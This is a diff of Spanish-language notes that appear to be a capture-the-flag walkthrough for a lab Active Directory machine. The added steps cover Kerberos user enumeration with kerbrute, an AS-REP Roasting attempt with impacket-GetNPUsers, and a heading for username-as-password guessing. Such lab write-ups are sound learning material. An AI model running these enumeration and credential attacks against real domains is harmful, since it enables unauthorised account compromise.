@@ -33,7 +33,7 @@ smbclient -L 10.129.13.11 -N
 No podemos enumerar ningún recurso compartido
 
 ## Kerberos
-Haremos una enumeracion de uusuarios a traves de kerberos
+Haremos una enumeración de usuarios a través de kerberos
 ```shell
 kerbrute userenum --dc 10.129.13.11 -d streamIO.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
 ```
@@ -44,4 +44,18 @@ martin@streamIO.htb
 administrator@streamIO.htb
 ```
 
-Con estos usuarios probamops a enumerar recursos compartidos 
+Validamos los usuarios
+```shell
+kerbrute userenum --dc 10.129.13.11 -d streamIO.htb users.txt 
+```
+
+Viendo que son usuarios que existen
+
+Probaremos si los usuarios son vulnerables a [[AS-REP Roasting]]
+### AS-REP Roast Attack
+```shell
+impacket-GetNPUsers -no-pass -usersfile users.txt streamIO.htb/
+```
+
+Probaremos tambien si tienen el nombre de usuario como contraseña
+### User as Password
